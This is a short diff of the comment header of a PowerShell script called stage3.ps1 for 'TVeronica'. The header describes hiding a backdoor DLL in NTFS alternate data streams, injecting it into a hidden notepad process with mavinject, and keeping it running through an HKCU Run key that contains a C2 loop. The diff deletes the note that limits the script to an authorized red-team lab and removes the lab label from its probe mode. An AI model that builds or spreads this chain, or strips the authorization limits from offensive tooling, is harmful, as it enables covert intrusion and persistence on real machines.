@@ -1,5 +1,4 @@
 # stage3.ps1 - TVeronica Stage 3+4: STAGING (NTFS ADS) + INJECTION (mavinject) + PERSISTENCE
-# Authorized red team / detection-validation lab only.
 #
 #   1. ensure target process (default notepad.exe - started HIDDEN if not running)
 #   2. stage inject.dll + backdoor.dll into NTFS ADS:  report.log:inject.dll / report.log:backdoor.dll
@@ -9,7 +8,7 @@
 #   4. persist: HKCU Run -> rundll32.exe "report.log:backdoor.dll",Start
 #
 # Exit codes: 0 = ok | 1 = missing payload | 2 = no target process | 3 = ADS staging failed
-# Lab: -Probe drops %TEMP%\tveronica_probe first (real DLLs write a marker and exit instead of C2 loop)
+# -Probe drops %TEMP%\tveronica_probe first (real DLLs write a marker and exit instead of C2 loop)
 
 param(
     [string]$StageDir,
